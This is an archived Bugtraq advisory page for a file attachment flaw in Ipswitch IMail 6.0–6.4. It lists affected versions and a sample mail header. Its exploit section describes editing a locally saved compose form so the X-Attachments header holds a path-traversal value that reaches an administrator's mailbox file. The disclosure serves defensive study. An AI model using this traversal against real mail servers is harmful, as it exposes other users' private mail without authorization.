#bid1617<p><b><span style="font-size: 18pt;">IPSWITCH IMail File Attachment Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/1617/info">info</a><br><a href="http://www.securityfocus.com/bid/1617/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/1617/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/1617/solution">solution</a><br><a href="http://www.securityfocus.com/bid/1617/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
<table border="0" cellpadding="4" cellspacing="0">
<tr>
<td>
<span class="label">Bugtraq ID:</span>
</td>
<td>
				1617
			</td>
</tr>
<tr>
<td>
<span class="label">Class:</span>
</td>
<td>
				Access Validation Error
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">CVE:</span>
</td>
<td>
</td>
</tr>
<tr>
<td>
<span class="label">Remote:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Local:</span>
</td>
<td>
				Unknown
			</td>
</tr>
<tr>
<td>
<span class="label">Published:</span>
</td>
<td>
				Aug 30 2000 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Updated:</span>
</td>
<td>
				Aug 30 2000 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Credit:</span>
</td>
<td>
				This vulnerability was discovered and reported by Timescape &lt;vellad@kattare.com&gt;.

 This advisory was drafted with the help of the SecurityFocus.com Vulnerability Help Team. For more information or assistance drafting advisories please mail vulnhelp@securi
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">Vulnerable:</span>
</td>
<td>
				
					Ipswitch IMail 6.4 <br/>
					
				
					Ipswitch IMail 6.3 <br/>
					
				
					Ipswitch IMail 6.2 <br/>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP6a<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP6<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP5<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP4<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP3<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0<br/>
</span>
					
				
					Ipswitch IMail 6.1 <br/>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP6a<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP6<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP5<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP4<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP3<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0<br/>
</span>
					
				
					Ipswitch IMail 6.0 <br/>
<span class="related">
						
							-
						
						Microsoft Windows NT 3.5.1 <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP6a<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP6<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP5<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP4<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP3<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0<br/>
</span>
</td>
</tr>
<tr>
<td colspan="2">
<div class="breakline"></div>
</td>
</tr>
<tr valign="top">
<td>
<span class="label">Not Vulnerable:</span>
</td>
<td>
</td>
</tr>
</table>
</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
	Here is a sample mail header sent by IMAIL web services which<br/>has an attachment. Please note that this is line wrapped for readability.<br/><br/>Date: Tue, 11 Jul 2000 13:10:28 +0200<br/>Message-ID: &lt;200007111310.AA2374238664@bar.com&gt;<br/>MIME-Version: 1.0 Content-Type: multipart/mixed;  <br/>boundary="==IMail_v5.0==" <br/>From: "Timescape" &lt;foo@bar.com&gt;<br/>Reply-To: &lt;foo@bar.com&gt; <br/>To: &lt;foo@bar.com&gt;<br/>Subject: test<br/>X-Mailer: &lt;IMail v5.01&gt; <br/>X-Attachments: D:\IMAIL\spool\gonzo2.jpg ;<br/>X-MimeOLE: Produced By Microsoft MimeOLE V5.00.2919.6700 <br/>Return-Path: &lt;foo@bar.com&gt; <br/>X-OriginalArrivalTime: 11 Jul 2000 11:20:48.0256 (UTC) FILETIME=10327800:01BFEB2A<br/><br/>This is a multi-part message in MIME format.<br/><br/>--==IMail_v5.0==<br/>Content-Type: text/plain;<br/>        charset="iso-8859-1"<br/>Content-Transfer-Encoding: 7bit<br/><br/>--==IMail_v5.0==<br/>Content-Type: application/octet-stream;<br/>        name="gonzo2.jpg "<br/>Content-Transfer-Encoding: base64<br/><br/>--==IMail_v5.0==--<br/><br/>The thing which we will be exploiting is the<br/>X-Attachments: D:\IMAIL\spool\gonzo2.jpg ;<br/><br/>I made it work by modifing the compose message HTML file and<br/>saved it locally.  Then i can just arrange the path to the<br/>attachment so that it can read<br/><br/>X-Attachments: D:\IMAIL\spool\..\bar\users\admin\main.mbx ;
	
		<ul>
</ul>
</div>